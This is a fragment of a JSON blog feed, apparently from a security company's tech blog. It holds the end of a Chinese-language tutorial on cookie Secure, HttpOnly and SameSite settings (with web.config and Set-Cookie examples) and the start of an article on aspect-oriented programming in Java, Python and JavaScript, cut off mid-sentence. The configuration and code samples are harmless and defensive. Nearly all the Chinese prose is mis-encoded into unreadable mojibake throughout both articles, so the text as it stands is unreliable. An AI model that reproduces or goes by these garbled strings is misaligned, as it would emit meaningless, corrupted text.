ç¬¬ä¸€æ­¥</h3>\n<p>ç¢ºä¿è‡ªå·±çš„ç¶²ç«™æ˜¯ Https SSL ï¼Œå¦å‰‡ä½ æœƒç™¼ç¾ä½ çš„ç¶²ç«™ä¸€ç›´åœ¨æŠŠä½¿ç”¨è€…ç™»å‡ºï¼Œç›¸é—œè¨­ç½®å¯ä»¥åƒè€ƒå®˜æ–¹æ–‡ä»¶ <a href=\"https://docs.microsoft.com/zh-tw/iis/manage/configuring-security/how-to-set-up-ssl-on-iis\">How to Set Up SSL</a></p>\n<h3 id=\"%E7%AC%AC%E4%BA%8C%E6%AD%A5\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%BA%8C%E6%AD%A5\">#</a> ç¬¬äºŒæ­¥</h3>\n<p>è¨­å®šSecure &amp; HttpOnlyæœ‰å¾ˆå¤šç¨®æ–¹æ³•ï¼Œæˆ‘é€™é‚Šä»¥ <code>ASP.NET</code> ä¾†èˆ‰ä¾‹ï¼Œä¿®æ”¹ä½ çš„ <code>web.config</code>ï¼Œæ–°å¢ï¼š</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">&lt;system.web>  <br> &lt;httpCookies httpOnlyCookies=â€trueâ€ requireSSL=â€trueâ€ />  <br>&lt;system.web><br><br>requireSSL=â€trueâ€ è¨­å®š Secure ï¼Œ<br><br>httpOnlyCookies=â€trueâ€ è¨­å®š HttpOnly</code></pre>\n<p>é€™æ¨£è¨­å®šå®Œå¾Œï¼Œå°±å®Œæˆäº† Secure &amp; HttpOnly çš„è¨­å®šï¼</p>\n<h3 id=\"samesite-2\"><a class=\"direct-link\" href=\"#samesite-2\">#</a> SameSite</h3>\n<p>SameSite çš„å±¬æ€§å¯ä»¥é€²è¡Œä¸‰ç¨®è¨­å®š</p>\n<p><strong>Strict</strong>ï¼šé€™æ˜¯é™åˆ¶æœ€åš´æ ¼çš„è¨­å®šï¼Œæœƒå®Œå…¨ç¦æ­¢ç¬¬ä¸‰æ–¹çš„ Cookie è«‹æ±‚ï¼ŒåŸºæœ¬ä¸Šåªæœ‰åœ¨ç¶²åŸŸå’Œ URL ä¸­çš„ç¶²åŸŸç›¸åŒï¼Œæ‰æœƒå‚³é Cookie è«‹æ±‚ï¼Œèˆ‰ä¾‹ä¾†èªªï¼Œç•¶ç¶²ç«™è£¡æœ‰ä¸€å€‹ FB é€£çµæ™‚ï¼Œé»é–‹é€£çµï¼Œä½¿ç”¨è€…å¿…é ˆè¦å†ç™»å…¥ä¸€æ¬¡ FB ï¼Œå› ç‚ºç¶²ç«™æ²’æœ‰å‚³é€ä»»ä½• FB çš„ Cookie ã€‚</p>\n<p>é€™æ˜¯ä¸‰ç¨®è¨­å®šä¸­æœ€åš´è¬¹ä¹Ÿæœ€å®‰å…¨çš„è¨­å®šï¼Œä½†ä¹Ÿå› æ­¤æœƒè®“ä½¿ç”¨è€…åœ¨ç¶²ç«™çš„ä½¿ç”¨é«”é©—ä¸Šè®Šå¾—æ¯”è¼ƒä¸æ–¹ä¾¿ï¼Œé€šå¸¸æœƒä½¿ç”¨æ–¼éŠ€è¡Œæˆ–æ˜¯è³¼ç‰©ç¶²ç«™ç­‰æœ‰é‡‘æµäº¤æ˜“çš„ç¶²ç«™ä¸Šã€‚</p>\n<p>è¨­å®šçš„æ–¹æ³•ç‚ºåœ¨ Server ä¸Šé€²è¡Œè¨­å®š</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">Set-Cookie: CookieName=CookieValue; SameSite=Strict;</code></pre>\n<p><strong>Lax</strong>ï¼šè€Œä¹Ÿå› ç‚ºäº† Strict çš„åš´æ ¼ï¼Œæ‰€ä»¥æœ‰äº† Lax é€™å€‹æ¯”è¼ƒç¬¦åˆä½¿ç”¨è€…ä½¿ç”¨é«”é©—ä¸Šçš„å€¼ç”¢ç”Ÿï¼Œ Lax çš„è¦æ±‚åŒæ¨£æœƒé™åˆ¶å¤§å¤šæ•¸çš„ç¬¬ä¸‰æ–¹è«‹æ±‚ï¼Œä½† Lax æœƒå…è¨± Get çš„è«‹æ±‚ï¼Œä»¥è¡¨å–®ä¾†èˆ‰ä¾‹ï¼š</p>\n<p><img src=\"/img/posts/jo/zerobased-secure-samesite-httponly/p4.png\" alt=\"\"></p>\n<p>å’Œ none çš„å…¨éƒ¨å…è¨±èˆ‡ Strict çš„å…¨éƒ¨ä¸å…è¨±ä¾†èªªï¼Œ Lax ç¦æ­¢äº†æ¯”è¼ƒä¸å®‰å…¨çš„ POST è«‹æ±‚ï¼Œå»åˆæœ‰ä¸€å®šçš„å®‰å…¨æ€§ï¼Œå› æ­¤æ˜¯ SameSite ç›®å‰åœ¨æ‡‰ç”¨ä¸Šè¼ƒå¸¸å‡ºç¾çš„è¨­å®šå€¼ï¼Œè€Œ2020å¹´2æœˆç™¼å¸ƒçš„ Chrome 80 ä»¥å¾Œçš†æ˜¯é è¨­ç¶²ç«™ä»¥ Lax é€²è¡Œè¨­å®šã€‚</p>\n<p>è¨­å®šçš„æ–¹æ³•ç‚ºåœ¨ Server ä¸Šé€²è¡Œè¨­å®š</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">Set-Cookie: CookieName=CookieValue; SameSite=Lax;</code></pre>\n<p><strong>None</strong>ï¼šé€™å€‹å€¼é¡§åæ€ç¾©å°±æ˜¯ä¸é™åˆ¶ Cookie å‚³é€çš„æ„æ€ï¼Œä¸éå¦‚æœåœ¨ç¶²ç«™ä¸Šæƒ³è¦å°‡ SameSite çš„å€¼è¨­å®šç‚º None çš„è©±ï¼Œç¶²ç«™ä¸­çš„ Secure å¿…é ˆè¦æ˜¯é–‹å•Ÿçš„ï¼Œ None çš„è¨­å®šæ‰æœƒç”Ÿæ•ˆï¼Œç®—æ˜¯ç€è¦½å™¨ç‚ºäº†ç¶²ç«™çš„å®‰å…¨æ€§ä¸Šåšçš„ä¸€äº›å°é™åˆ¶ã€‚</p>\n<p>è¨­å®šçš„æ–¹æ³•ç‚ºåœ¨ Server ä¸Šé€²è¡Œè¨­å®š</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">Set-Cookie: widget\\_session=abc123; SameSite=None; Secure</code></pre>\n<h2 id=\"%E7%B5%90%E8%AB%96\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AB%96\">#</a> çµè«–</h2>\n<p>åœ¨ç€è¦½å™¨ä¸Šé€™ä¸‰ç¨®å±¬æ€§çš„è¨­å®šå°å·¥ç¨‹å¸«ä¾†èªªï¼Œæˆæœ¬ä¸é«˜ä½†é”æˆçš„æ•ˆæœå»ä¸å°ï¼Œå› æ­¤å¯ä»¥èªªæ˜¯ç¶²ç«™å®‰å…¨çš„å…¥é–€ç¶“å…¸æ¬¾é…ç½®ï¼Œä¸éä¹Ÿæ­£æˆ‘å¦‚å‰é¢æ‰€èªªï¼Œä¸‰å€‹å±¬æ€§æ²’æœ‰å…±å­˜æœ‰å¯èƒ½æœƒç”¢ç”Ÿé æœŸå¤–çš„å®‰å…¨é¢¨éšªï¼Œæ‰€ä»¥å¦‚æœå¯ä»¥çš„è©±ï¼Œè«‹ç›¡å¯èƒ½çš„å°‡é€™ä¸‰ç¨®å±¬æ€§éƒ½é€²è¡Œè¨­å®šã€‚</p>\n<p>æ­¤å¤–ï¼Œå€¼å¾—æ³¨æ„çš„ä¸€é»æ˜¯ SameSite çš„è¨­å®šä¸åªæ˜¯åœ¨ Cookie çš„é€å‡ºä¸Šï¼Œå…¶å¯¦ä¹Ÿæœƒå½±éŸ¿åˆ° Cookie çš„å¯«å…¥ï¼Œå¦‚æœéœ€è¦åœ¨ä½¿ç”¨è€…çš„ä½¿ç”¨é«”é©—ä¸Šé€²è¡Œè¡¡é‡çš„è©±ï¼Œå»ºè­°é™¤éæ˜¯éŠ€è¡Œæˆ–æ˜¯è³¼ç‰©ç¶²ç«™ç­‰æœ‰é‡‘æµäº¤æ˜“çš„ç¶²ç«™ï¼Œå¦å‰‡ä¸€èˆ¬çš„ç¶²ç«™å…¶å¯¦åªè¦è¨­å®š Lax çš„å€¼ä¸¦æ­é… CSRF Token å°±å·²ç¶“æ“æœ‰è¼ƒé«˜å±¤ç´šçš„ CSRF æ”»æ“Šé˜²è­·äº†ã€‚</p>\n<h2 id=\"%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80\"><a class=\"direct-link\" href=\"#%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80\">#</a> å»¶ä¼¸é–±è®€</h2>\n<h3 id=\"%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%B8%80%EF%BC%89-%E8%AA%8D%E8%AD%98-csrf%EF%BC%88cross-site-request-forgery-%EF%BC%89\"><a class=\"direct-link\" href=\"#%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%B8%80%EF%BC%89-%E8%AA%8D%E8%AD%98-csrf%EF%BC%88cross-site-request-forgery-%EF%BC%89\">#</a> é›¶åŸºç¤è³‡å®‰ç³»åˆ—ï¼ˆä¸€ï¼‰-èªè­˜ CSRFï¼ˆCross Site Request ForgeryÂ ï¼‰</h3>\n<blockquote>\n<p><a href=\"https://tech-blog.cymetrics.io/jo/zerobased-cross-site-request-forgery\">èªè­˜ CSRFï¼ˆCross Site Request Forgeryï¼‰</a></p>\n</blockquote>\n<h3 id=\"%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%BA%8C%EF%BC%89-%E8%AA%8D%E8%AD%98-xss%EF%BC%88cross-site-scripting%EF%BC%89\"><a class=\"direct-link\" href=\"#%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%BA%8C%EF%BC%89-%E8%AA%8D%E8%AD%98-xss%EF%BC%88cross-site-scripting%EF%BC%89\">#</a> é›¶åŸºç¤è³‡å®‰ç³»åˆ—ï¼ˆäºŒï¼‰-èªè­˜ XSSï¼ˆCross-Site Scriptingï¼‰</h3>\n<blockquote>\n<p><a href=\"https://tech-blog.cymetrics.io/jo/zerobased-cross-site-scripting\">èªè­˜ XSSï¼ˆCross-Site Scriptingï¼‰</a></p>\n</blockquote>\n<h2 id=\"%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99\"><a class=\"direct-link\" href=\"#%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99\">#</a> åƒè€ƒè³‡æ–™</h2>\n<h3 id=\"httpcookies-element\"><a class=\"direct-link\" href=\"#httpcookies-element\">#</a> httpCookies Element</h3>\n<blockquote>\n<p><a href=\"https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/ms228262%28v=vs.100%29?redirectedfrom=MSDN\">https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/ms228262(v=vs.100)?redirectedfrom=MSDN</a></p>\n</blockquote>\n<h3 id=\"how-to-set-up-ssl\"><a class=\"direct-link\" href=\"#how-to-set-up-ssl\">#</a> How to Set UpÂ SSL</h3>\n<blockquote>\n<p><a href=\"https://docs.microsoft.com/zh-tw/iis/manage/configuring-security/how-to-set-up-ssl-on-iis\">https://docs.microsoft.com/zh-tw/iis/manage/configuring-security/how-to-set-up-ssl-on-iis</a></p>\n</blockquote>\n<h3 id=\"cookie-%E7%9A%84-samesite-%E5%B1%AC%E6%80%A7\"><a class=\"direct-link\" href=\"#cookie-%E7%9A%84-samesite-%E5%B1%AC%E6%80%A7\">#</a> Cookie çš„ SameSiteÂ å±¬æ€§</h3>\n<blockquote>\n<p><a href=\"https://www.ruanyifeng.com/blog/2019/09/cookie-samesite.html\">https://www.ruanyifeng.com/blog/2019/09/cookie-samesite.html</a></p>\n</blockquote>\n",
      "date_published": "2021-05-28T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/maxchiu/aop/",
      "url": "https://tech-blog.cymetrics.io/posts/maxchiu/aop/",
      "title": "ä¾†è«‡è«‡ AOP (Aspect-Oriented Programming) çš„ç²¾ç¥èˆ‡å„ç¨®ä¸»æµå¯¦ç¾æ¨¡å¼çš„å·®ç•°",
      "content_html": "<p>é€™ç¯‡æ–‡ç« å°‡å¾ AOP çš„æ ¸å¿ƒæ€æƒ³è«‡åˆ°ç›®å‰ä¸»æµå¯¦ç¾ AOP çš„ä¸åŒç­–ç•¥ä¸¦æ¯”è¼ƒä»–å€‘çš„å·®ç•°ï¼Œé©åˆäº†è§£ Java èªè¨€æˆ–è€…æœ‰ç¨å¾®ç©é AOP ä½†æ˜¯ä¸æ¸…æ¥šå…¶åŸç†çš„äººé–±è®€ã€‚</p>\n<p>éš¨è‘—è»Ÿé«”å°ˆæ¡ˆè¦æ¨¡çš„æ“´å¤§ï¼Œç¨‹å¼ç¢¼çš„ç¶­è­·åŸºæœ¬ä¸Šå·²ç¶“è®Šæˆäº†ä¸€å€‹ä¸–ç´€é›£é¡Œï¼Œå­¸ç•Œå’Œæ¥­ç•Œä¸€ç›´ä»¥ä¾†éƒ½æŒçºŒè¨±å¤šé™ä½ç¨‹å¼ç¢¼ç¶­è­·é›£åº¦çš„æ–¹æ¡ˆã€‚ <a href=\"https://en.wikipedia.org/wiki/Aspect-oriented_programming\">AOP ( Aspected-Oriented Programming )</a> ä½œç‚ºä¸€å€‹åœ¨ä¸Šä¸–ç´€æœ«å°±è¢«æå‡ºçš„ç·¨ç¨‹å…¸ç¯„ï¼Œé€™æ•¸åå¹´ä¾†ä¹Ÿç¶“æ­·äº†è¨±å¤šçš„è½‰è®Šã€‚</p>\n<!-- summary -->\n<p>é€™ç¯‡æ–‡ç« æœƒå…ˆè¨è«– AOP çš„è¡Œç‚ºæœ¬è³ªï¼Œä¸¦å‰–æ Java èªè¨€ä¸­ AOP å¯¦ç¾çš„å¹¾ç¨®æ¨¡å¼ï¼Œä¸¦ä¸”æ¯”è¼ƒå½¼æ­¤ä¹‹é–“çš„è¡Œç‚ºã€‚</p>\n<!-- summary -->\n<h4 id=\"aop-%E7%9A%84%E6%9C%AC%E8%B3%AA-%E2%80%94-%E6%94%B9%E8%AE%8A%E7%A8%8B%E5%BC%8F%E7%A2%BC%E7%9A%84%E6%B5%81%E7%A8%8B\"><a class=\"direct-link\" href=\"#aop-%E7%9A%84%E6%9C%AC%E8%B3%AA-%E2%80%94-%E6%94%B9%E8%AE%8A%E7%A8%8B%E5%BC%8F%E7%A2%BC%E7%9A%84%E6%B5%81%E7%A8%8B\">#</a> AOP çš„æœ¬è³ªâ€Šâ€”â€Šæ”¹è®Šç¨‹å¼ç¢¼çš„æµç¨‹</h4>\n<p>ä»¥ Web Server é–‹ç™¼å ´æ™¯ç‚ºä¾‹ï¼Œæˆ‘å€‘ç¶“å¸¸æœƒéœ€è¦åœ¨å¾ˆå¤š end-point API çš„æ–¹æ³•åŸ·è¡Œå‰å…ˆåŸ·è¡Œæ¬Šé™é©—è­‰ï¼Œæˆ–è€…æ˜¯åœ¨é€™äº› end-point åŸ·è¡Œ transaction å¤±æ•—æ™‚å¯ä»¥ rollbackã€‚</p>\n<p>é€™äº›åœ¨ç¨‹å¼ç¢¼ä¸­æœƒé‡è¤‡å‡ºç¾ï¼Œå®ƒå€‘æ˜¯é‡è¦ä½†æ˜¯ä¸å±¬æ–¼æˆ‘å€‘æ ¸å¿ƒæ¥­å‹™çš„æ“ä½œï¼Œå¦‚æœè¦é‡è¤‡è¤‡è£½è²¼ä¸Šåˆ°å°ˆæ¡ˆä¸­çš„å„è™•æœƒé€ æˆé›£ä»¥ç¶­è­·çš„çª˜å¢ƒã€‚å› æ­¤ AOP è©¦åœ–è®“é€™äº›å¸¸è¢«è¤‡ç”¨çš„é‚è¼¯ç¨ç«‹å‡ºä¾†ï¼Œç”¨ç‰¹æ®Šçš„æ©Ÿåˆ¶åŒ…è£èµ·ä¾†ï¼Œè®“æˆ‘å€‘çš„æ¥­å‹™é‚è¼¯ä¸éœ€è¦å»çœ‹åˆ°ä»»ä½•ç›¸é—œçš„ç¨‹å¼ç¢¼ã€‚</p>\n<p><img src=\"/img/posts/max/TheSpiritAndImplementationOfAOP/0____Bm36Dv5mm97e2vF.jpg\" alt=\"\"></p>\n<p>é€™ä»¶äº‹æœ¬è³ªä¸Šè½èµ·ä¾†è·Ÿå‘¼å«å‡½å¼æ²’æœ‰å¤ªå¤§çš„å€åˆ¥ï¼Œç„¶è€Œ AOP æœ¬è³ªä¸Šæ˜¯å±¬æ–¼ä¸€ç¨® <a href=\"https://en.wikipedia.org/wiki/Metaprogramming\">Meta Programming</a> ã€‚å…·é«”ä¾†èªªï¼Œå¯¦ç¾ AOP çš„å·¥å…·è™•ç†çš„æ˜¯ç¨‹å¼ç¢¼æœ¬èº«ï¼ˆæˆ– bytecodeæœ¬èº«ï¼‰ æˆ–æ˜¯ class (æˆ– object ) çš„è³‡è¨Šï¼Œæ˜¯ç”¨ä¾†æ”¹è®Šç¨‹å¼ç¢¼çš„æµç¨‹æˆ–ç¹”å…¥ï¼ˆ weaving ) æ–°çš„ç¨‹å¼ç¢¼ï¼Œè€Œéåªæ˜¯å–®ç´”åœ°ã€ŒåŸ·è¡Œä¸€æ®µç¨‹å¼ã€ã€‚</p>\n<p>AOP åªæ˜¯ç¨®æŒ‡å°ç·¨ç¨‹æ¨¡å¼çš„åŸå‰‡è€Œå·²ï¼Œåœ¨ä¸åŒçš„èªè¨€å’Œç”Ÿæ…‹ç³»ä¸­ï¼Œé¡ä¼¼çš„æ¦‚å¿µéƒ½æœ‰ä¸åŒçš„å¯¦ä½œæ–¹å¼ï¼Œç„¶è€Œå…±é€šé»éƒ½æ˜¯è—‰ç”±æ”¹è®Šç¨‹å¼ç¢¼çš„æµç¨‹è®“æ ¸å¿ƒé‚è¼¯ä¸æœƒå—åˆ°é¡å¤–çš„åˆ‡é¢é‚è¼¯çš„å½±éŸ¿ã€‚</p>\n<p>åœ¨éœæ…‹èªè¨€ä¸­ï¼Œç¨‹å¼çš„æµç¨‹åœ¨ç·¨è­¯æ™‚æœŸå°±æœƒè¢«å¯«æ­»äº†ï¼Œè¦ç©¿æ’åˆ‡é¢åœ¨ç¨‹å¼ç¢¼å„è™•æœƒéœ€è¦æœ‰é¡å¤–çš„å·¥å…·ä¾†æ”¯æŒã€‚è€Œåœ¨å‹•æ…‹èªè¨€ä¸­ï¼Œå› ç‚ºç¨‹å¼çš„æµç¨‹ä¸¦ä¸æ˜¯åœ¨ç·¨è­¯æ™‚æœŸå°±è¢«æ±ºå®šäº†ï¼Œè€Œæ˜¯å¯ä»¥å‹•æ…‹æ›´æ”¹çš„ï¼Œæ‰€ä»¥é€šå¸¸åŸç”Ÿèªæ³•å°±æ”¯æŒäº† AOP åŠŸèƒ½ã€‚</p>\n<p>ä»¥ Python ç‚ºä¾‹ï¼ŒPythonå…§å»ºçš„ decorator ä¿®é£¾è©å¯ä»¥å°‡è¢«åˆ‡å…¥ ï¼ˆ advised ) çš„å‡½å¼ç›´æ¥å‚³å…¥åˆ¥çš„å‡½å¼ï¼Œä¸¦ä¸”è—‰ç”±å›å‚³å¦ä¸€å€‹å·²ç¶“è¢«ä¿®é£¾å®Œæˆçš„å‡½å¼ç‰©ä»¶ä¾†å¯¦ç¾ AOP ï¼ˆ è‡³æ–¼é€™ç©¶ç«Ÿæ˜¯ä¸æ˜¯ä¸€ç¨® <a href=\"https://en.wikipedia.org/wiki/Decorator_pattern\">Decorator Pattern</a> çš„å¯¦ç¾ï¼Œå¯ä»¥åƒ è€ƒ [2] çš„è¨è«–ï¼‰</p>\n<pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">decorator</span><span class=\"token punctuation\">(</span>func<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><br>    <span class=\"token keyword\">def</span> <span class=\"token function\">wrapper</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><br>        <span class=\"token comment\"># åŸ·è¡Œå‰çš„é—œæ³¨åˆ‡é¢, </span><br>        func<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>        <span class=\"token comment\"># åŸ·è¡Œå¾Œçš„é—œæ³¨åˆ‡é¢</span><br>    <span class=\"token keyword\">return</span> wrapper<br><br><span class=\"token decorator annotation punctuation\">@decorator</span><br><span class=\"token keyword\">def</span> <span class=\"token function\">decorated</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><br>    <span class=\"token comment\"># æ ¸å¿ƒæ¥­å‹™é‚è¼¯</span></code></pre>\n<p>è€Œåœ¨ Javascript ä¾†èªªï¼Œ ES7 ä¹‹å¾Œä¹Ÿé–‹å§‹æ”¯æ´è·Ÿ Python é¡ä¼¼èªæ³•çš„ decoratorã€‚</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">decorator</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">return</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">target</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token comment\">// åŸ·è¡Œå‰çš„é—œæ³¨åˆ‡é¢</span><br>    <span class=\"token function\">target</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token comment\">// åŸ·è¡Œå¾Œçš„é—œæ³¨åˆ‡é¢</span><br>  <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span><br><br>@decorator<br><span class=\"token keyword\">function</span> <span class=\"token function\">decorated</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  <span class=\"token comment\">// do something</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>åŒæ™‚ï¼Œå¦‚æœç”¨é React çš„è©±ï¼Œå¯èƒ½æœƒå° HOC ( Higher Order Component) æœ‰å°è±¡ï¼Œ ä»¥æˆ‘è‡ªå·±çš„è§’åº¦ä¾†çœ‹ï¼ŒHOC åœ¨æœ¬è³ªä¸Šå…¶å¯¦å¾ˆæ¥è¿‘ AOPã€‚</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> <span class=\"token function-variable function\">withExtraProps</span> <span class=\"token operator\">=</span> <span class=\"token parameter\">Component</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">(</span><span class=\"token parameter\"><span class=\"token punctuation\">{</span> <span class=\"token operator\">...</span>props <span class=\"token punctuation\">}</span></span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">(</span><br>    <span class=\"token operator\">&lt;</span>Component <span class=\"token punctuation\">{</span><span class=\"token operator\">...</span>props<span class=\"token punctuation\">}</span> extraProps<span class=\"token operator\">=</span><span class=\"token string\">\"Hello~\"</span> <span class=\"token operator\">/</span><span class=\"token operator\">></span><br>  <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token keyword\">const</span> ComponentWithExtraProps <span class=\"token operator\">=</span> <span class=\"token function\">withExtraProps</span><span class=\"token punctuation\">(</span>Component<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token keyword\">const</span> instance <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;</span>CComponentWithExtraProps defaultProp<span class=\"token operator\">=</span><span class=\"token string\">\"test\"</span> <span class=\"token operator\">/</span><span class=\"token operator\">></span><span class=\"token punctuation\">;</span></code></pre>\n<p>æ¥è‘—è®“æˆ‘å€‘ä¾†çœ‹çœ‹éœæ…‹èªè¨€å¯¦ç¾ AOP æœ‰å“ªäº›ä¸åŒçš„æ‰‹æ®µã€‚ å¤§é«”å¯ä»¥åˆ†ç‚º â€œ Run-time AOP â€ è·Ÿ â€œ Compile-time AOP â€ ã€‚æ–‡ç« ä»¥ä¸‹çš„éƒ¨åˆ†å°‡ä»‹ç´¹ Java ç”Ÿæ…‹ç³»ä¸­ä¸åŒçš„ AOP å¯¦ç¾å–å¾‘ã€‚</p>\n<h4 id=\"compile-time-aop-%E2%80%94-aspectj-%E4%B8%AD%E7%9A%84%E7%AD%96%E7%95%A5\"><a class=\"direct-link\" href=\"#compile-time-aop-%E2%80%94-aspectj-%E4%B8%AD%E7%9A%84%E7%AD%96%E7%95%A5\">#</a> Compile-Time AOPâ€Šâ€”â€ŠAspectJÂ ä¸­çš„ç­–ç•¥</h4>\n<p><a href=\"http://eclipse.org/aspectj/\">AspectJ</a> æ˜¯ç”± Eclipse Foundation æ‰€ç¶­è­·çš„ï¼ŒJavaç”Ÿæ…‹ç³»ä¸­æœ€æ³›ç”¨çš„ AOP å·¥å…·ã€‚æˆ‘æœƒå…ˆç°¡è¿° AspectJ çš„é‹ä½œæ¦‚å¿µï¼Œæ¥è‘—åœ¨å¾Œé¢çµ¦å‡ºå¯¦ä½œå’Œåçµ„è­¯çš„å¯¦éš›ç¯„ä¾‹ã€‚</p>\n<p>ç°¡å–®èªªæ˜ AspectJ çš„ä½¿ç”¨æƒ…å¢ƒæœƒæ˜¯é€™æ¨£ï¼šæˆ‘å€‘æœ‰ä¸€å€‹ç‰©ä»¶é¡åˆ¥å®šç¾©è¦è¢«è¤‡ç”¨çš„åˆ‡é¢é‚è¼¯ï¼ˆ e.g. AuthorizeAspect ï¼‰ï¼Œå¦ä¸€å€‹ç‰©ä»¶é¡åˆ¥åŸ·è¡Œæ¥­å‹™é‚è¼¯ã€‚é€™å…©å€‹é¡åˆ¥å½¼æ­¤åœ¨ source code ä¸­æ˜¯æ²’æœ‰ç›´æ¥çš„é—œé€£çš„ï¼ˆåªæœ‰ meta informationï¼Œä¾‹å¦‚ @ annotation æ¨™è¨»å…¶ç‚ºåˆ‡å…¥é»æˆ–åˆ‡å…¥å‡½å¼ ) ï¼Œä½†åœ¨ç¨‹å¼ç¢¼åŸ·è¡Œå‰æˆ‘å€‘å¯ä»¥ç”¨ AspectJ å¥—ä»¶è‡ªå‹•ç”Ÿæˆå°‡å…©è€…é—œè¯èµ·ä¾†çš„ bytecode ï¼Œä¸¦ä¸”åœ¨æ­£ç¢ºçš„ä½ç½®æ’å…¥é€™äº› bytecode ã€‚</p>\n<p><img src=\"/img/posts/max/TheSpiritAndImplementationOfAOP/1__1o3LETcmZrvDa__1I__h9roQ.png\" alt=\"\"></p>\n<p>AspectJ å¯¦ç¾ AOP çš„æ–¹å¼ä¸»è¦æ˜¯æ‰€è¬‚çš„ Compile-time AOPã€‚åœ¨å»ºç½®æ™‚ä½¿ç”¨ AspectJ çš„æ’ä»¶ ( e.g. aspectj-maven-plugin )ï¼Œæˆ–æ˜¯åœ¨åŸ·è¡Œå‰è®“ JavaAgentå‘¼å« AspectJWeaver å°‡ aspects ç¹”å…¥åˆ° classfileã€‚<br>\nä¸¦ä¸”åœ¨åŸ·è¡ŒæœŸç”¨ aspectJ çš„ Runtime library ( e.g. aspectjrt ) ä½œç‚º Trampoline ä¾†å°‡ç¨‹å¼çš„ Control flow åœ¨æ­£ç¢ºçš„æ™‚é–“é»è·³è½‰çµ¦å°æ‡‰çš„ Adviceã€‚</p>\n<p>AspectJ å¯ä»¥æŒ‡ååœ¨ä¸åŒçš„æ™‚é–“é»åŸ·è¡Œ aspects çš„ç¹”å…¥ã€‚</p>\n<ul>\n<li>Compile Time Weaving<br>\nåœ¨ç·¨è­¯æ™‚å°±æŠŠ aspects è·Ÿä½ çš„åŸå§‹ç¢¼ä¸€èµ·å¾ç”¨å°ˆå±¬çš„ç·¨è­¯å™¨ (ajc) ç›´æ¥ç·¨è­¯æˆåŒ…å«äº† aspects çš„ classfileã€‚é€™å€‹æ“ä½œå¯ä»¥æ˜¯ java -&gt; class (æœ‰æºç¢¼çš„æƒ…æ³) æˆ–æ˜¯ class -&gt; class ( ç¹”å…¥ç¬¬ä¸‰æ–¹jaræª”çš„ç‹€æ³ )<br>\né€™éº¼åšçš„å¥½è™•å¾ˆæ˜é¡¯ï¼Œå°±æ˜¯åªè¦ ajc ç·¨è­¯å¥½äº†ï¼Œä¹‹å¾Œ run çš„æ™‚å€™éƒ½ä¸æœƒæœ‰é¡å¤–çš„ weaving overheadã€‚ä½†å£è™•å°±æ˜¯å¦‚æœè¦é—œé–‰æˆ–é–‹å•ŸæŸäº› aspectï¼Œå°±å¿…é ˆæ•´åŒ…é‡æ–° compileã€‚</li>\n</ul>\n<p><img src=\"/img/posts/max/TheSpiritAndImplementationOfAOP/0__O0jiGBeR8PEv__63Z.jpg\" alt=\"\"></p>\n<ul>\n<li>Load-Time Weaving<br>\nç›¸å°åœ°ï¼Œload-time weaving è—‰ç”±å®šç¾©é¡å¤–çš„ aspect config file (ä¸‹åœ–ä¸­çš„ aop.xml) ï¼ŒæŠŠ weavingçš„æ“ä½œæ¨é²åˆ° JVM çš„ classloader load classfile æ™‚æ‰æŠŠå°æ‡‰çš„ aspect ç¹”å…¥ã€‚ é€™æ¨£çš„æ“ä½œå„ªå‹¢ä¹Ÿå¾ˆæ˜é¡¯ï¼Œå°±æ˜¯ä¸éœ€è¦æ¯æ¬¡èª¿æ•´ aspect çš„ config æ™‚éƒ½éœ€è¦æ•´å€‹å°ˆæ¡ˆé‡æ–° compile ã€‚</li>\n</ul>\n<p>å¦‚æœå°æ–¼ Compile-Time Weaving è·Ÿ Load-Time Weaving çš„åŸ·è¡Œæ•ˆç‡å·®ç•°æœ‰èˆˆè¶£çš„è©±ï¼Œ[4] æ˜¯å€‹ benchmark 